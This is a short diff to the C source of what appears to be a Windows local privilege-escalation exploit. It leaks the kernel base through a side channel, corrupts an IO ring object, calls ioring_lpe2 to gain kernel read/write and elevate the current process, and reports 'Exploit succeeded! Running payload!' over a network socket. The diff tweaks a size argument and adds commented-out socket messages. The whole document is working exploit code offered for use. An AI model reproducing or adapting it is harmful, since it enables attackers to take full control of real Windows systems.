@@ -407,6 +407,7 @@ UINT64 do_sidechannel(/*SHELLCODE_CTX* ctx, const char* dump_path*/)
 
     return kernel_base;
 }
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 int main(int argc, char** argv)
 {
@@ -507,8 +508,10 @@ int main(int argc, char** argv)
     // Corrupt the IO ring object
     do_write(ioring_addr + 0x9D);
 
+    //sprintf_s(ptr_msg, sizeof(ptr_msg), "ioring lpe2");
+   //send(winSock, ptr_msg, strlen(ptr_msg), 0);
     // Get kernel RW & elevate our process, then fix up SeMediumDaclSd
-    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x1000, ioring_addr, g_kernel_base, build_rev);
+    ioring_lpe2(GetCurrentProcessId(), 0x65007500, 0x4000, ioring_addr, g_kernel_base, build_rev); // originally 0x1000
     cur_msg = "Exploit succeeded! Running payload!\n\n";
     send(winSock, cur_msg, strlen(cur_msg), 0);
 
